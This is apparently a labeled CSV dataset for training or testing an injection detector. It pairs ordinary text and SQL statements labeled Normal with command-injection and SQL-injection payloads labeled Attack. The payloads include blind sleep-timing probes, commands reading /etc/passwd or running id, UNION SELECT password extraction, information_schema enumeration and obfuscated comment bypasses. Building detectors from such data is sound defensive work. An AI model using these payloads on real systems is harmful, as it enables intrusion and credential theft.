Content,Category,Label
""");}print(`echo QHWLWM`.`echo $((41+28))`.`echo QHWLWM`.`echo QHWLWM`);\\QHWLWM",cmdexe2,Attack
'.print(`echo QLKXYP;echo $((79+46));echo QLKXYP;echo QLKXYP`);\\QLKXYP,cmdexe2,Attack
""");}print(`echo QNFOEE%0aecho $((91+41))%0aecho QNFOEE%0aecho QNFOEE`);%2529%257DQNFOEE",cmdexe2,Attack
)print(`echo QQGYPS`.`echo $((10+39))`.`echo QQGYPS`.`echo QQGYPS`);\\QQGYPS,cmdexe2,Attack
')print(`echo QTJEKD\necho $((90+98))\necho QTJEKD\necho QTJEKD`);.%252527QTJEKD,cmdexe2,Attack
""")print(`echo QZFGHE`.`echo $((4+60))`.`echo QZFGHE`.`echo QZFGHE`);.'QZFGHE",cmdexe2,Attack
""");}print(`echo RACXOI`.`echo $((81+11))`.`echo RACXOI`.`echo RACXOI`);#RACXOI",cmdexe2,Attack
'print(`echo RAZRYE;echo $((84+60));echo RAZRYE;echo RAZRYE`);\\RAZRYE,cmdexe2,Attack
'.print(`echo RDHTSN`.`echo $((90+44))`.`echo RDHTSN`.`echo RDHTSN`);.'RDHTSN,cmdexe2,Attack
""");}print(`echo RKXNWH%0aecho $((63+75))%0aecho RKXNWH%0aecho RKXNWH`);.%2527RKXNWH",cmdexe2,Attack
');}print(`echo RNSTSU;echo $((52+2));echo RNSTSU;echo RNSTSU`);RNSTSU,cmdexe2,Attack
""")print(`echo RPOOHR%0aecho $((72+27))%0aecho RPOOHR%0aecho RPOOHR`);%2523RPOOHR",cmdexe2,Attack
print(`echo RREYBJ`.`echo $((33+25))`.`echo RREYBJ`.`echo RREYBJ`);.'RREYBJ,cmdexe2,Attack
'print(`echo RRMVOG;echo $((30+37));echo RRMVOG;echo RRMVOG`);)}RRMVOG,cmdexe2,Attack
')print(`echo RUXOHA`.`echo $((74+92))`.`echo RUXOHA`.`echo RUXOHA`))}RUXOHA,cmdexe2,Attack
""".print(`echo RVELEJ;echo $((74+30));echo RVELEJ;echo RVELEJ`);\\RVELEJ",cmdexe2,Attack
""");}print(`echo RXUKTF\necho $((42+2))\necho RXUKTF\necho RXUKTF`);.%252527RXUKTF",cmdexe2,Attack
""".print(`echo RZWFMA`.`echo $((75+86))`.`echo RZWFMA`.`echo RZWFMA`);\\RZWFMA",cmdexe2,Attack
')print(`echo SATCYU`.`echo $((51+26))`.`echo SATCYU`.`echo SATCYU`);\\SATCYU,cmdexe2,Attack
);}print(`echo SCGPHN%0aecho $((41+99))%0aecho SCGPHN%0aecho SCGPHN`);%2529%257DSCGPHN,cmdexe2,Attack
""");}print(`echo SFBDLE\necho $((73+49))\necho SFBDLE\necho SFBDLE`);%252529%25257DSFBDLE",cmdexe2,Attack
""")print(`echo SGRKCG`.`echo $((91+4))`.`echo SGRKCG`.`echo SGRKCG`);.""SGRKCG",cmdexe2,Attack
'.print(`echo SMJBZB%0aecho $((19+71))%0aecho SMJBZB%0aecho SMJBZB`);//SMJBZB,cmdexe2,Attack
""")print(`echo SPKTID;echo $((50+54));echo SPKTID;echo SPKTID`);.""SPKTID",cmdexe2,Attack
""")print(`echo SPTGKB`.`echo $((57+66))`.`echo SPTGKB`.`echo SPTGKB`))}SPTGKB",cmdexe2,Attack
")print(`echo SQLMHW;echo $((75+6));echo SQLMHW;echo SQLMHW`);.""SQLMHW",cmdexe2,Attack
'print(`echo STJAIG%0aecho $((89+81))%0aecho STJAIG%0aecho STJAIG`);//STJAIG,cmdexe2,Attack
');}print(`echo SVXVYZ`.`echo $((35+1))`.`echo SVXVYZ`.`echo SVXVYZ`))}SVXVYZ,cmdexe2,Attack
);}print(`echo SWQEIO\necho $((64+42))\necho SWQEIO\necho SWQEIO`);%25255C%25255CSWQEIO,cmdexe2,Attack
)print(`echo SYVAYV%0aecho $((36+49))%0aecho SYVAYV%0aecho SYVAYV`);//SYVAYV,cmdexe2,Attack
');}print(`echo TBZBGJ`.`echo $((58+75))`.`echo TBZBGJ`.`echo TBZBGJ`);\\TBZBGJ,cmdexe2,Attack
""");}print(`echo TCCEGQ`.`echo $((87+34))`.`echo TCCEGQ`.`echo TCCEGQ`))}TCCEGQ",cmdexe2,Attack
');}print(`echo TFOYWK;echo $((13+51));echo TFOYWK;echo TFOYWK`);)}TFOYWK,cmdexe2,Attack
');}print(`echo TJELNR%0aecho $((81+0))%0aecho TJELNR%0aecho TJELNR`);.%2527TJELNR,cmdexe2,Attack
'print(`echo TPBMFF%0aecho $((79+13))%0aecho TPBMFF%0aecho TPBMFF`);%2523TPBMFF,cmdexe2,Attack
'.print(`echo TSTIED;echo $((94+6));echo TSTIED;echo TSTIED`);)}TSTIED,cmdexe2,Attack
'print(`echo TUDOUK;echo $((63+88));echo TUDOUK;echo TUDOUK`);TUDOUK,cmdexe2,Attack
print(`echo TVCCND%0aecho $((62+6))%0aecho TVCCND%0aecho TVCCND`);.%2527TVCCND,cmdexe2,Attack
""");}print(`echo TWEYRU;echo $((57+60));echo TWEYRU;echo TWEYRU`);TWEYRU",cmdexe2,Attack
')print(`echo TYAJKR`.`echo $((73+69))`.`echo TYAJKR`.`echo TYAJKR`);.'TYAJKR,cmdexe2,Attack
print(`echo UBBYNF%0aecho $((67+26))%0aecho UBBYNF%0aecho UBBYNF`);%2523UBBYNF,cmdexe2,Attack
""".print(`echo UCUISA;echo $((65+31));echo UCUISA;echo UCUISA`);UCUISA",cmdexe2,Attack
)print(`echo UDBRRF%0aecho $((39+57))%0aecho UDBRRF%0aecho UDBRRF`);%255C%255CUDBRRF,cmdexe2,Attack
'print(`echo UDOCFL\necho $((86+7))\necho UDOCFL\necho UDOCFL`);.%252522UDOCFL,cmdexe2,Attack
""".print(`echo UFRBLO%0aecho $((1+17))%0aecho UFRBLO%0aecho UFRBLO`);%2529%257DUFRBLO",cmdexe2,Attack
""");}print(`echo UHQKLI`.`echo $((50+4))`.`echo UHQKLI`.`echo UHQKLI`);.'UHQKLI",cmdexe2,Attack
""")print(`echo UKYEKY\necho $((70+74))\necho UKYEKY\necho UKYEKY`);%252523UKYEKY",cmdexe2,Attack
""".print(`echo ULLCKQ\necho $((63+14))\necho ULLCKQ\necho ULLCKQ`);%252523ULLCKQ",cmdexe2,Attack
""")print(`echo ULOIOS\necho $((51+30))\necho ULOIOS\necho ULOIOS`);//ULOIOS",cmdexe2,Attack
"'.print(`echo ULZFRM`.`echo $((96+62))`.`echo ULZFRM`.`echo ULZFRM`);.""ULZFRM",cmdexe2,Attack
"'print(`echo UPGYTK;echo $((49+93));echo UPGYTK;echo UPGYTK`);.""UPGYTK",cmdexe2,Attack
');}print(`echo URYEKO`.`echo $((45+57))`.`echo URYEKO`.`echo URYEKO`);#URYEKO,cmdexe2,Attack
);}print(`echo UTBTBN;echo $((92+40));echo UTBTBN;echo UTBTBN`);UTBTBN,cmdexe2,Attack
""");}print(`echo UTFROF\necho $((67+6))\necho UTFROF\necho UTFROF`);//UTFROF",cmdexe2,Attack
');}print(`echo UXXDJD\necho $((17+17))\necho UXXDJD\necho UXXDJD`);.%252522UXXDJD,cmdexe2,Attack
');}print(`echo VBLUSZ%0aecho $((96+95))%0aecho VBLUSZ%0aecho VBLUSZ`);//VBLUSZ,cmdexe2,Attack
')print(`echo VEMMAU;echo $((59+39));echo VEMMAU;echo VEMMAU`);)}VEMMAU,cmdexe2,Attack
""".print(`echo VFIBZQ;echo $((31+85));echo VFIBZQ;echo VFIBZQ`);.'VFIBZQ",cmdexe2,Attack
')print(`echo VHLBFA\necho $((78+60))\necho VHLBFA\necho VHLBFA`);%252529%25257DVHLBFA,cmdexe2,Attack
)print(`echo VIVSXO;echo $((60+28));echo VIVSXO;echo VIVSXO`);VIVSXO,cmdexe2,Attack
')print(`echo VPYMWX%0aecho $((10+22))%0aecho VPYMWX%0aecho VPYMWX`);%255C%255CVPYMWX,cmdexe2,Attack
"')print(`echo VRYZVO`.`echo $((19+54))`.`echo VRYZVO`.`echo VRYZVO`);.""VRYZVO",cmdexe2,Attack
'.print(`echo VWGDMS`.`echo $((77+11))`.`echo VWGDMS`.`echo VWGDMS`);#VWGDMS,cmdexe2,Attack
)print(`echo VWOEOC`.`echo $((97+4))`.`echo VWOEOC`.`echo VWOEOC`);VWOEOC,cmdexe2,Attack
'.print(`echo VXYNWW\necho $((29+16))\necho VXYNWW\necho VXYNWW`);%25255C%25255CVXYNWW,cmdexe2,Attack
""");}print(`echo WCABAY%0aecho $((46+3))%0aecho WCABAY%0aecho WCABAY`);WCABAY",cmdexe2,Attack
'print(`echo WCPHMV\necho $((3+88))\necho WCPHMV\necho WCPHMV`);%252523WCPHMV,cmdexe2,Attack
""".print(`echo WKFYWT%0aecho $((57+28))%0aecho WKFYWT%0aecho WKFYWT`);//WKFYWT",cmdexe2,Attack
'.print(`echo WMQCVY;echo $((96+95));echo WMQCVY;echo WMQCVY`);.'WMQCVY,cmdexe2,Attack
""");}print(`echo WQBRFD;echo $((85+53));echo WQBRFD;echo WQBRFD`);\\WQBRFD",cmdexe2,Attack
"print(`echo WQMIIN`.`echo $((36+90))`.`echo WQMIIN`.`echo WQMIIN`);.""WQMIIN",cmdexe2,Attack
'print(`echo WSILLK\necho $((70+70))\necho WSILLK\necho WSILLK`);%25255C%25255CWSILLK,cmdexe2,Attack
')print(`echo WUCPEY%0aecho $((63+16))%0aecho WUCPEY%0aecho WUCPEY`);%2523WUCPEY,cmdexe2,Attack
);}print(`echo WVNNUB%0aecho $((6+67))%0aecho WVNNUB%0aecho WVNNUB`);//WVNNUB,cmdexe2,Attack
print(`echo WZLIFQ`.`echo $((3+42))`.`echo WZLIFQ`.`echo WZLIFQ`))}WZLIFQ,cmdexe2,Attack
);}print(`echo WZOXHV`.`echo $((36+81))`.`echo WZOXHV`.`echo WZOXHV`);WZOXHV,cmdexe2,Attack
""".print(`echo XBJBDE`.`echo $((48+93))`.`echo XBJBDE`.`echo XBJBDE`);//XBJBDE",cmdexe2,Attack
""")print(`echo XCIHWH%0aecho $((57+90))%0aecho XCIHWH%0aecho XCIHWH`);.%2522XCIHWH",cmdexe2,Attack
print(`echo XEMHBO%0aecho $((11+24))%0aecho XEMHBO%0aecho XEMHBO`);//XEMHBO,cmdexe2,Attack
""");}print(`echo XILSBL\necho $((74+71))\necho XILSBL\necho XILSBL`);%25255C%25255CXILSBL",cmdexe2,Attack
""".print(`echo XKLFAP%0aecho $((76+43))%0aecho XKLFAP%0aecho XKLFAP`);.%2527XKLFAP",cmdexe2,Attack
);}print(`echo XMVWXQ%0aecho $((48+88))%0aecho XMVWXQ%0aecho XMVWXQ`);%255C%255CXMVWXQ,cmdexe2,Attack
')print(`echo XQTSKO\necho $((61+71))\necho XQTSKO\necho XQTSKO`);.%252522XQTSKO,cmdexe2,Attack
');}print(`echo XREPUI`.`echo $((55+99))`.`echo XREPUI`.`echo XREPUI`);//XREPUI,cmdexe2,Attack
print(`echo XWPSAV%0aecho $((22+11))%0aecho XWPSAV%0aecho XWPSAV`);%2529%257DXWPSAV,cmdexe2,Attack
'.print(`echo XYCPFN\necho $((60+62))\necho XYCPFN\necho XYCPFN`);XYCPFN,cmdexe2,Attack
""");}print(`echo XYXNLP\necho $((64+13))\necho XYXNLP\necho XYXNLP`);XYXNLP",cmdexe2,Attack
'.print(`echo YBQGFX%0aecho $((90+18))%0aecho YBQGFX%0aecho YBQGFX`);%2523YBQGFX,cmdexe2,Attack
""");}print(`echo YDWEZS;echo $((87+70));echo YDWEZS;echo YDWEZS`);//YDWEZS",cmdexe2,Attack
');}print(`echo YERJDV`.`echo $((3+37))`.`echo YERJDV`.`echo YERJDV`);YERJDV,cmdexe2,Attack
)print(`echo YIXKKR;echo $((83+25));echo YIXKKR;echo YIXKKR`);.'YIXKKR,cmdexe2,Attack
)print(`echo YKQUFP\necho $((94+91))\necho YKQUFP\necho YKQUFP`);.%252522YKQUFP,cmdexe2,Attack
""");}print(`echo YSGCAB%0aecho $((76+3))%0aecho YSGCAB%0aecho YSGCAB`);%2523YSGCAB",cmdexe2,Attack
');}print(`echo YXZEEF;echo $((79+80));echo YXZEEF;echo YXZEEF`);.'YXZEEF,cmdexe2,Attack
print(`echo ZHAWPM;echo $((18+57));echo ZHAWPM;echo ZHAWPM`);)}ZHAWPM,cmdexe2,Attack
""".print(`echo ZLVKDU`.`echo $((0+22))`.`echo ZLVKDU`.`echo ZLVKDU`))}ZLVKDU",cmdexe2,Attack
""".print(`echo ZTFYUM%0aecho $((56+81))%0aecho ZTFYUM%0aecho ZTFYUM`);.%2522ZTFYUM",cmdexe2,Attack
);}print(`echo ZXKKBW\necho $((18+93))\necho ZXKKBW\necho ZXKKBW`);%252523ZXKKBW,cmdexe2,Attack
"""& sleep 0 && str=$(echo IUGZRA) && str1=${#str} && [ 3 -eq ${str1} ] && sleep 1 \\",cmdexe2,Attack
& sleep 0 && str=$(echo IUGZRA) && str1=${#str} && [ 3 -eq ${str1} ] && sleep 1 \\,cmdexe2,Attack
'& sleep 0 && str=$(echo IUGZRA) && str1=${#str} && [ 3 -eq ${str1} ] && sleep 1 \\,cmdexe2,Attack
"""& sleep 0 && str=$(echo JICOQS) && str1=${#str} && [ 3 -eq ${str1} ] && sleep 1",cmdexe2,Attack
& sleep 0 && str=$(echo JICOQS) && str1=${#str} && [ 3 -eq ${str1} ] && sleep 1,cmdexe2,Attack
'& sleep 0 && str=$(echo JICOQS) && str1=${#str} && [ 3 -eq ${str1} ] && sleep 1,cmdexe2,Attack
"""& sleep 0 && str=$(echo UXESAW) && str1=${#str} && [ 3 -eq ${str1} ] && sleep 1 '",cmdexe2,Attack
& sleep 0 && str=$(echo UXESAW) && str1=${#str} && [ 3 -eq ${str1} ] && sleep 1 ',cmdexe2,Attack
'& sleep 0 && str=$(echo UXESAW) && str1=${#str} && [ 3 -eq ${str1} ] && sleep 1 ',cmdexe2,Attack
"""& sleep 0 && str=$(echo VZETTM) && str1=${#str} && [ 3 -eq ${str1} ] && sleep 1 &",cmdexe2,Attack
& sleep 0 && str=$(echo VZETTM) && str1=${#str} && [ 3 -eq ${str1} ] && sleep 1 &,cmdexe2,Attack
'& sleep 0 && str=$(echo VZETTM) && str1=${#str} && [ 3 -eq ${str1} ] && sleep 1 &,cmdexe2,Attack
"""& sleep 0 && str=$(echo WGVBBV) && str1=${#str} && [ 3 -eq ${str1} ] && sleep 1 |",cmdexe2,Attack
& sleep 0 && str=$(echo WGVBBV) && str1=${#str} && [ 3 -eq ${str1} ] && sleep 1 |,cmdexe2,Attack
'& sleep 0 && str=$(echo WGVBBV) && str1=${#str} && [ 3 -eq ${str1} ] && sleep 1 |,cmdexe2,Attack
"""& sleep 0 && str=$(echo XGXYKB) && str1=${#str} && [ 3 -eq ${str1} ] && sleep 1 """,cmdexe2,Attack
"& sleep 0 && str=$(echo XGXYKB) && str1=${#str} && [ 3 -eq ${str1} ] && sleep 1 """,cmdexe2,Attack
"'& sleep 0 && str=$(echo XGXYKB) && str1=${#str} && [ 3 -eq ${str1} ] && sleep 1 """,cmdexe2,Attack
"""& sleep 0 && str=$(echo YQNAJZ) && str1=${#str} && [ 3 -eq ${str1} ] && sleep 1 //",cmdexe2,Attack
& sleep 0 && str=$(echo YQNAJZ) && str1=${#str} && [ 3 -eq ${str1} ] && sleep 1 //,cmdexe2,Attack
'& sleep 0 && str=$(echo YQNAJZ) && str1=${#str} && [ 3 -eq ${str1} ] && sleep 1 //,cmdexe2,Attack
"""& sleep 0 && str=$(echo ZYJHAC) && str1=${#str} && [ 3 -eq ${str1} ] && sleep 1 #",cmdexe2,Attack
& sleep 0 && str=$(echo ZYJHAC) && str1=${#str} && [ 3 -eq ${str1} ] && sleep 1 #,cmdexe2,Attack
'& sleep 0 && str=$(echo ZYJHAC) && str1=${#str} && [ 3 -eq ${str1} ] && sleep 1 #,cmdexe2,Attack
"""; str=$(echo ASBPAS); str1=${#str}; if [ 4 -ne ${str1} ]; then sleep 0; else sleep 1; fi |",cmdexe2,Attack
'; str=$(echo ASBPAS); str1=${#str}; if [ 4 -ne ${str1} ]; then sleep 0; else sleep 1; fi |,cmdexe2,Attack
; str=$(echo ASBPAS); str1=${#str}; if [ 4 -ne ${str1} ]; then sleep 0; else sleep 1; fi |,cmdexe2,Attack
"""; str=$(echo BVJEPJ); str1=${#str}; if [ 4 -ne ${str1} ]; then sleep 0; else sleep 1; fi #",cmdexe2,Attack
'; str=$(echo BVJEPJ); str1=${#str}; if [ 4 -ne ${str1} ]; then sleep 0; else sleep 1; fi #,cmdexe2,Attack
; str=$(echo BVJEPJ); str1=${#str}; if [ 4 -ne ${str1} ]; then sleep 0; else sleep 1; fi #,cmdexe2,Attack
"""; str=$(echo DJSHTX); str1=${#str}; if [ 4 -ne ${str1} ]; then sleep 0; else sleep 1; fi //",cmdexe2,Attack
'; str=$(echo DJSHTX); str1=${#str}; if [ 4 -ne ${str1} ]; then sleep 0; else sleep 1; fi //,cmdexe2,Attack
; str=$(echo DJSHTX); str1=${#str}; if [ 4 -ne ${str1} ]; then sleep 0; else sleep 1; fi //,cmdexe2,Attack
"""; str=$(echo ERVJHE); str1=${#str}; if [ 4 -ne ${str1} ]; then sleep 0; else sleep 1; fi \\",cmdexe2,Attack
'; str=$(echo ERVJHE); str1=${#str}; if [ 4 -ne ${str1} ]; then sleep 0; else sleep 1; fi \\,cmdexe2,Attack
; str=$(echo ERVJHE); str1=${#str}; if [ 4 -ne ${str1} ]; then sleep 0; else sleep 1; fi \\,cmdexe2,Attack
"""; str=$(echo EZCOIE); str1=${#str}; if [ 4 -ne ${str1} ]; then sleep 0; else sleep 1; fi '",cmdexe2,Attack
'; str=$(echo EZCOIE); str1=${#str}; if [ 4 -ne ${str1} ]; then sleep 0; else sleep 1; fi ',cmdexe2,Attack
; str=$(echo EZCOIE); str1=${#str}; if [ 4 -ne ${str1} ]; then sleep 0; else sleep 1; fi ',cmdexe2,Attack
"""; str=$(echo IITGSD); str1=${#str}; if [ 4 -ne ${str1} ]; then sleep 0; else sleep 1; fi &",cmdexe2,Attack
'; str=$(echo IITGSD); str1=${#str}; if [ 4 -ne ${str1} ]; then sleep 0; else sleep 1; fi &,cmdexe2,Attack
; str=$(echo IITGSD); str1=${#str}; if [ 4 -ne ${str1} ]; then sleep 0; else sleep 1; fi &,cmdexe2,Attack
"""; str=$(echo NSANUP); str1=${#str}; if [ 4 -ne ${str1} ]; then sleep 0; else sleep 1; fi",cmdexe2,Attack
'; str=$(echo NSANUP); str1=${#str}; if [ 4 -ne ${str1} ]; then sleep 0; else sleep 1; fi,cmdexe2,Attack
; str=$(echo NSANUP); str1=${#str}; if [ 4 -ne ${str1} ]; then sleep 0; else sleep 1; fi,cmdexe2,Attack
"""; str=$(echo UEOOZQ); str1=${#str}; if [ 4 -ne ${str1} ]; then sleep 0; else sleep 1; fi """,cmdexe2,Attack
"'; str=$(echo UEOOZQ); str1=${#str}; if [ 4 -ne ${str1} ]; then sleep 0; else sleep 1; fi """,cmdexe2,Attack
"; str=$(echo UEOOZQ); str1=${#str}; if [ 4 -ne ${str1} ]; then sleep 0; else sleep 1; fi """,cmdexe2,Attack
;system('cat /etc/passwd'),cmdexe2,Attack
system('cat /etc/passwd');,cmdexe2,Attack
;system('id'),cmdexe2,Attack
;system('/usr/bin/id'),cmdexe2,Attack
;|/usr/bin/id|,cmdexe2,Attack
`/usr/bin/id`,cmdexe2,Attack
|/usr/bin/id,cmdexe2,Attack
|/usr/bin/id|,cmdexe2,Attack
||/usr/bin/id;,cmdexe2,Attack
||/usr/bin/id|,cmdexe2,Attack
;/usr/bin/id\n,cmdexe2,Attack
|usr/bin/id\n,cmdexe2,Attack
"Mark, 'Call me when you get to the gate and I'll come out and open it up'",sqli2,Normal
union was a great select,sqli2,Normal
h2<h1,sqli2,Normal
D'or 1st parfume,sqli2,Normal
1) a-b=c,sqli2,Normal
John+or@var.es,sqli2,Normal
"DEAR FINN,--I think it would do; copy should reach us second post",sqli2,Normal
"// tables on home page, such as recent best, recent worst, etc",sqli2,Normal
I usually select icecream where cookies are in union with other fruits,sqli2,Normal
_SELECT all the rows of fromDate = @-_,sqli2,Normal
I like to perform benchmarks on my PC,sqli2,Normal
SELECT * FROM users WHERE active=1;,sqli2,Normal
SELECT COUNT(*) FROM logs;,sqli2,Normal
UPDATE settings SET value='on' WHERE key='maintenance';,sqli2,Normal
SELECT username FROM accounts WHERE role='admin';,sqli2,Normal
"INSERT INTO logs (event, timestamp) VALUES ('start', NOW());",sqli2,Normal
SELECT email FROM subscribers;,sqli2,Normal
"SELECT id, name FROM products LIMIT 10;",sqli2,Normal
SELECT version();,sqli2,Normal
SHOW TABLES;,sqli2,Normal
DESCRIBE users;,sqli2,Normal
SELECT * FROM login_attempts WHERE success=true;,sqli2,Normal
SELECT * FROM sessions WHERE expires > NOW();,sqli2,Normal
DELETE FROM temp_sessions WHERE created < NOW() - INTERVAL 1 HOUR;,sqli2,Normal
SELECT NOW();,sqli2,Normal
SELECT DATABASE();,sqli2,Normal
SELECT user();,sqli2,Normal
SET NAMES 'utf8';,sqli2,Normal
SELECT * FROM inventory WHERE stock > 0;,sqli2,Normal
SELECT * FROM orders ORDER BY date DESC LIMIT 5;,sqli2,Normal
SELECT ip_address FROM access_logs;,sqli2,Normal
SELECT * FROM audit_log;,sqli2,Normal
SELECT name FROM services;,sqli2,Normal
SELECT COUNT(*) FROM employees;,sqli2,Normal
SELECT * FROM backups WHERE status='complete';,sqli2,Normal
SELECT * FROM api_keys;,sqli2,Normal
SELECT email FROM user_profiles;,sqli2,Normal
SELECT * FROM reports;,sqli2,Normal
SELECT * FROM logs WHERE severity='info';,sqli2,Normal
SELECT status FROM tasks;,sqli2,Normal
SELECT * FROM health_checks;,sqli2,Normal
SELECT id FROM analytics_data;,sqli2,Normal
SELECT DISTINCT(user_id) FROM activity_log;,sqli2,Normal
SELECT * FROM alerts WHERE read=false;,sqli2,Normal
SELECT * FROM views;,sqli2,Normal
SELECT * FROM uploads WHERE status='processed';,sqli2,Normal
SELECT * FROM roles;,sqli2,Normal
SELECT permission FROM access_control;,sqli2,Normal
SELECT * FROM updates;,sqli2,Normal
SELECT last_login FROM users;,sqli2,Normal
SELECT COUNT(*) FROM transactions;,sqli2,Normal
SELECT * FROM queue WHERE status='ready';,sqli2,Normal
SELECT name FROM departments;,sqli2,Normal
SELECT * FROM customer_feedback;,sqli2,Normal
SELECT * FROM sessions;,sqli2,Normal
SELECT log_message FROM app_logs;,sqli2,Normal
SELECT * FROM tokens;,sqli2,Normal
SELECT * FROM subscriptions;,sqli2,Normal
SELECT * FROM billing;,sqli2,Normal
SELECT name FROM users WHERE verified=true;,sqli2,Normal
SELECT * FROM logs ORDER BY created_at DESC;,sqli2,Normal
UPDATE accounts SET status='active' WHERE id=10;,sqli2,Normal
"SELECT id, role FROM staff WHERE department='IT';",sqli2,Normal
"INSERT INTO audit_log (action, time) VALUES ('login', NOW());",sqli2,Normal
SELECT COUNT(*) FROM visits;,sqli2,Normal
SELECT * FROM purchases LIMIT 20;,sqli2,Normal
SELECT version();,sqli2,Normal
SHOW DATABASES;,sqli2,Normal
DESCRIBE orders;,sqli2,Normal
SELECT * FROM login_events WHERE result='success';,sqli2,Normal
SELECT * FROM sessions WHERE valid=true;,sqli2,Normal
DELETE FROM cache WHERE created_at < NOW() - INTERVAL 2 HOUR;,sqli2,Normal
SELECT CURRENT_DATE;,sqli2,Normal
SELECT DATABASE();,sqli2,Normal
SELECT current_user;,sqli2,Normal
SET time_zone = '+00:00';,sqli2,Normal
SELECT * FROM stock WHERE available = true;,sqli2,Normal
SELECT * FROM invoices ORDER BY id DESC LIMIT 3;,sqli2,Normal
SELECT ip FROM login_logs;,sqli2,Normal
SELECT * FROM event_log;,sqli2,Normal
SELECT title FROM pages;,sqli2,Normal
SELECT COUNT(*) FROM sessions;,sqli2,Normal
SELECT * FROM tokens WHERE active=true;,sqli2,Normal
SELECT * FROM preferences;,sqli2,Normal
SELECT * FROM activity_log;,sqli2,Normal
SELECT * FROM alerts WHERE status='new';,sqli2,Normal
SELECT status FROM systems;,sqli2,Normal
SELECT * FROM logs WHERE type='debug';,sqli2,Normal
SELECT id FROM tracking_data;,sqli2,Normal
SELECT DISTINCT(username) FROM accounts;,sqli2,Normal
SELECT * FROM updates WHERE status='finished';,sqli2,Normal
SELECT * FROM stats;,sqli2,Normal
SELECT * FROM uploads;,sqli2,Normal
SELECT * FROM roles WHERE active=true;,sqli2,Normal
SELECT permission FROM role_permissions;,sqli2,Normal
SELECT * FROM patch_log;,sqli2,Normal
SELECT last_updated FROM config;,sqli2,Normal
SELECT COUNT(*) FROM billing;,sqli2,Normal
SELECT * FROM tasks WHERE assigned=true;,sqli2,Normal
SELECT department FROM employee_directory;,sqli2,Normal
SELECT * FROM messages WHERE read=false;,sqli2,Normal
SELECT * FROM customer_records;,sqli2,Normal
SELECT log_entry FROM debug_log;,sqli2,Normal
SELECT * FROM auth_tokens;,sqli2,Normal
SELECT * FROM user_settings;,sqli2,Normal
SELECT * FROM billing_history;,sqli2,Normal
%00'' UNION SELECT password FROM Users WHERE username-''foobar''--,sqli2,Attack
%00' UNION SELECT password FROM Users WHERE username-'tom'--,sqli2,Attack
%0A%0d+select+user+from+dual+%0A%0D,sqli2,Attack
"%0Aselect 0x00, 0x41 like/*!31337table_name*/,3 from information_schema.tables limit 1",sqli2,Attack
%0Aselect 0x00%2C 0x41 not like%2F*%2100000table_name*%2F%2C3 from information_schema.tables limit 1,sqli2,Attack
0+div+1+union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A1%2C2%2Ccurrent_user,sqli2,Attack
1%09and%091=1%09--,sqli2,Attack
1%0Aand%0A1=1%0A--,sqli2,Attack
1%0Band%0B1=1%0B--,sqli2,Attack
1%0Cand%0C1=1%0C--,sqli2,Attack
1%0Dand%0D1=1%0D--,sqli2,Attack
1 || 1 = 1 into outfile 'result.txt',sqli2,Attack
"(/*!12345sELecT*/(@)from(/*!12345sELecT*/(@:=0x00),(/*!12345sELecT*/(@)from(`InFoRMAtiON_sCHeMa`.`ColUMNs`)where(`TAblE_sCHemA`=DatAbAsE/*data*/())and(@)in(@:=CoNCat%0a(@,0x3c62723e5461626c6520466f756e64203a20,TaBLe_nAMe,0x3a3a,column_name))))a)",sqli2,Attack
/*!12345union select*/,sqli2,Attack
